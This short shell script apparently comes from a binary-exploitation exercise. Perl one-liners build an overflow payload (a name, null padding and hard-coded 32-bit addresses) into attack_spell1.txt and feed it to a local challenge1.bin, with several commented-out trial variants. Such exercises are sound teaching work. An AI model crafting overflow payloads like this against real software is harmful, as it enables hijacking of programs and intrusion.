#write name to file
perl -e 'print "Rock Beom Kim";' > attack_spell1.txt

perl -e 'print "\0";' >> attack_spell1.txt

#write 89 characters of i to file
perl -e 'print "\x0"x84;' >> attack_spell1.txt

perl -e 'print "\x66";' >> attack_spell1.txt

perl -e 'print "\x0"x15;' >> attack_spell1.txt
#perl -e 'print "\x00\xf3\xff\xbf";' >> attack_spell1.txt

perl -e 'print "\xf2\x84\x04\x08";' >> attack_spell1.txt

perl -e 'print "\x60\xa0\x04\x08";' >> attack_spell1.txt

#perl -e 'print "\xf0\x85\x04\x08";' >> attack_spell1.txt
#0x804a060
#perl -e 'print "\x60\xa0\x04\x08";' >> attack_spell1.txt
#write past i
#perl -e 'print "\x66"' >> attack_spell1.txt

#perl -e 'print "\0"x15;' >> attack_spell1.txt

#extra buffer room
#perl -e 'print "\x38\x85\x04\x08\x80\xa0\x04\x08\x01;"' >> attack_spell1.txt

./challenge1.bin < attack_spell1.txt
